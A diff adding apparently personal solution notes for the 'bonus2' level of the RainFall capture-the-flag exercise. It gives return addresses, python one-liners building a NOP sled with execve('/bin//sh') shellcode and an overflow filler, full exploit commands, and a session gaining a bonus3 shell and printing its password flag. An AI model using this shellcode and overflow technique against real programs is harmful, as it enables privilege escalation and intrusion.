@@ -1,0 +1,47 @@
+bonus2
+
+return address: 0xBFFFF680 sometimes 0xBFFFF690 or 0xBFFFF6A0
+(nopsled is a good idea)
+this is where main() copies argv[1], truncates to 40 bytes via strncpy
+
+for exploit to work the two strings argv[1] and argv[2] have to be concatenated
+    and `LANG' variable has to be set to either `fi' or `nl'
+
+export LANG=fi
+r UT34567890RS34567890PQ34567890NO3456789a 0JK34567890GH34567zxzx
+
+
+crafted argv[1]:
+    nopsled + shell code
+    $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") 
+
+crafted argv[2]:
+    filler + original EBP + return address
+    $(python -c "print('A'*14 + '\xBF\xFF\xF7\x08'[::-1] + '\xBF\xFF\xF6\x80'[::-1])")
+
+
+if LANG=fi, bytes[18:22] of argv[2] will be return address of greetuser()
+if LANG=nl, bytes[23:27] of argv[2] will be return address of greetuser()
+
+i also found it necessary to restore the original ebp value (leave instruction),
+so bytes [14:18] will be original ebp value when entering greetuser() function
+
+when you are in Helsinki, you do:
+export LANG=fi; ./bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*14 + '\xBF\xFF\xF7\x08'[::-1] + '\xBF\xFF\xF6\x80'[::-1])")
+
+
+and when you are in Amsterdam, you do:
+export LANG=nl; ./bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*19 + '\xBF\xFF\xF7\x08'[::-1] + '\xBF\xFF\xF6\x80'[::-1])")
+
+
+
+
+bonus2@RainFall:/tmp$ export LANG=fi; /home/user/bonus2/bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*14+'\xBF\xFF\xF6\xA0\xBF\xFF\xF7\x08'[::-1])")
+Hyvää päivää ??????????????1?1?Qh//shh/bin1??
+                                             ????̀AAAAAAAAAAAAA???????
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+$
+
